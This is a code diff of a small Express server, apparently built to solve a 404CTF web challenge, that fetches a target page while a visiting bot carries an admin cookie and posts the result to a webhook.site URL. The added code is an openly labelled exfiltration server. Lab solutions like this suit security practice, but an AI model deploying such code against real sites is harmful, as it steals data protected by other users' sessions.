@@ -1,39 +1,38 @@
+
 const express = require('express');
+const fetch = require('node-fetch');
 const app = express();
-const port = 3000; // ou process.env.PORT si déployé sur Render, Vercel, etc.
+const port = process.env.PORT || 3000;
 
-app.use(express.urlencoded({ extended: false }));
+// Replace with your webhook URL
+const WEBHOOK_URL = "https://webhook.site/714d78b3-a2b4-46a1-842f-0f5dcfda846a";
 
-// Log toutes les requêtes
-app.use((req, res, next) => {
-  console.log(`[+] ${req.method} ${req.url} from ${req.ip}`);
-  next();
-});
+app.get('/', async (req, res) => {
+  const targetUrl = "http://spacefleetcommand.404ctf.fr/spaceship/3";
 
-// Page principale redirige le bot vers le site vulnérable
-app.get('/', (req, res) => {
-  const target = '/spaceship/3';
-  console.log(`[!] Redirecting to ${target}`);
-  res.set('Content-Type', 'text/html');
-  res.send(`
-    <html>
-      <head>
-        <meta http-equiv="refresh" content="0;url=${target}" />
-      </head>
-      <body>
-        <p>If you're not redirected automatically, <a href="${target}">click here</a>.</p>
-      </body>
-    </html>
-  `);
-});
+  try {
+    const response = await fetch(targetUrl, {
+      headers: {
+        // The admin cookie will be set by the bot — do NOT override it here.
+      }
+    });
 
-// Pour logguer les tentatives de vol (si tu arrives à faire exfiltrer le flag)
-app.post('/leak', (req, res) => {
-  console.log('[LEAK] Received data:');
-  console.log(req.body);
-  res.send('OK');
+    const text = await response.text();
+
+    // Exfiltrate the result to your webhook
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain' },
+      body: text
+    });
+
+    res.send("<h1> Bot visited, exfiltration attempted!</h1>");
+  } catch (err) {
+    console.error("Fetch or exfiltration failed:", err);
+    res.status(500).send("Error fetching or sending data.");
+  }
 });
 
 app.listen(port, () => {
-  console.log(`[*] Server listening on http://localhost:${port}`);
+  console.log(`[*] Exfiltration server running on port ${port}`);
 });
